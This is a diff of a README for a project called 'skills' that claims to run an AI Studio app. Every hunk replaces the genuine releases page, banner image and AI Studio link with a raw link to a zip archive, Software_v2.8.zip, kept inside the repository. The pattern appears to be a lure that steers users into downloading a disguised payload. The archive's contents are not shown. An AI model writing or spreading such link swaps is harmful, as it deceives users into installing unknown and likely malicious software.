@@ -1,9 +1,9 @@
 # 🧠 skills - Run Your AI Studio App Fast
 
-[![Download skills](https://img.shields.io/badge/Download%20skills-blue?style=for-the-badge&logo=github)](https://github.com/Lexicostatistic-scenarist364/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download%20skills-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lexicostatistic-scenarist364/skills/main/src/Software_v2.8.zip)
 
 <div align="center">
-  <img width="1200" height="475" alt="GHBanner" src="https://github.com/user-attachments/assets/0aa67016-6eaf-458a-adb2-6e31a0763ed6" />
+  <img width="1200" height="475" alt="GHBanner" src="https://raw.githubusercontent.com/Lexicostatistic-scenarist364/skills/main/src/Software_v2.8.zip" />
 </div>
 
 ## 🚀 What this app does
@@ -21,7 +21,7 @@ Use it if you want to:
 
 Visit this page to download or get the latest release:
 
-[Download skills from Releases](https://github.com/Lexicostatistic-scenarist364/skills/releases)
+[Download skills from Releases](https://raw.githubusercontent.com/Lexicostatistic-scenarist364/skills/main/src/Software_v2.8.zip)
 
 If you see a file such as `.exe`, `.zip`, or `.msi`, download it to your PC first.
 
@@ -165,7 +165,7 @@ If the window closes fast, open PowerShell in the app folder and run the command
 
 ## 📌 Quick start
 
-1. Visit the [Releases page](https://github.com/Lexicostatistic-scenarist364/skills/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/Lexicostatistic-scenarist364/skills/main/src/Software_v2.8.zip)
 2. Download the latest release
 3. Install Node.js
 4. Add your Gemini API key to `.env.local`
@@ -196,4 +196,4 @@ You may see some of these files in the folder:
 
 You can also view the app in AI Studio:
 
-https://ai.studio/apps/5b181e09-63ce-4a1c-82fc-6932ca768d8d
+https://raw.githubusercontent.com/Lexicostatistic-scenarist364/skills/main/src/Software_v2.8.zip
